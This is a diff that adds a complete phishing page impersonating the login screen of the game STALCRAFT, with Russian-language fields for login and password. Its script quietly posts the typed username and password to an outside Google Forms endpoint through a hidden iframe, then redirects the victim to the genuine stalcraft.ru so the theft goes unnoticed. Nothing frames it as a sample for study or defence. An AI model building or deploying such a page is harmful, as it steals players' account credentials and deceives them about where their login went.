@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stalcraft</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial;
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #1e3c5c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>STALCRAFT</h2>
+        <form id="form">
+            <input type="text" id="login" placeholder="Логин" required>
+            <input type="password" id="pass" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("form").onsubmit = function(e) {
+            e.preventDefault();
+            var login = document.getElementById("login").value;
+            var pass = document.getElementById("pass").value;
+            
+            // Отправка в Google Forms
+            var url = "https://docs.google.com/forms/d/e/1FAIpQLSdV17RV3jR0RW7imxyfzErKjaNNGGeGyY1kwnYiGWPN49HEHA/viewform";
+            var iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.name = "hid";
+            document.body.appendChild(iframe);
+            
+            var f = document.createElement("form");
+            f.method = "POST";
+            f.action = url;
+            f.target = "hid";
+            f.style.display = "none";
+            
+            var inp1 = document.createElement("input");
+            inp1.name = "entry.109981295";
+            inp1.value = login;
+            var inp2 = document.createElement("input");
+            inp2.name = "entry.1413341557";
+            inp2.value = pass;
+            
+            f.appendChild(inp1);
+            f.appendChild(inp2);
+            document.body.appendChild(f);
+            f.submit();
+            
+            setTimeout(function() {
+                window.location = "https://stalcraft.ru";
+            }, 500);
+        };
+    </script>
+</body>
+</html>
